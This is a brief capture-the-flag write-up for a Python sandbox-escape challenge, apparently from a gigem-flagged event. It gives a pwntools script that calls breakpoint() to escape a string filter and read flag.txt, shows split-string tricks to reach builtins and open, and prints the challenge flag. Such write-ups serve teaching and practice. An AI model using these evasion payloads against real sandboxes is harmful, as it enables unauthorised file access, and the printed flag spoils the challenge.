# Jailbreak

I lost my calculator for an upcoming exam, so I made a calculator using the python interpreter. Feel free to use it for your exams too!

## Solution

We can use several pyjail techniques to bypass the weak string based filtering. The `breakpoint` function is not banned, neither are `globals` and such derivatives.
```py
from pwn import remote
# localhost 1337
r = remote('localhost', 1337)

r.sendline(b'breakpoint()')
r.sendline(b'open("flag.txt").read()')

# r.sendline(b'getattr(globals()["__built""ins__"], "op""en")("flag.txt").read()')

# r.sendline(b'string.capwords.__globals__["__built""ins__"]["op""en"]("flag.txt").read()')

r.interactive()
```

flag:
`gigem{1ts_4_ja1l_br3ak}`
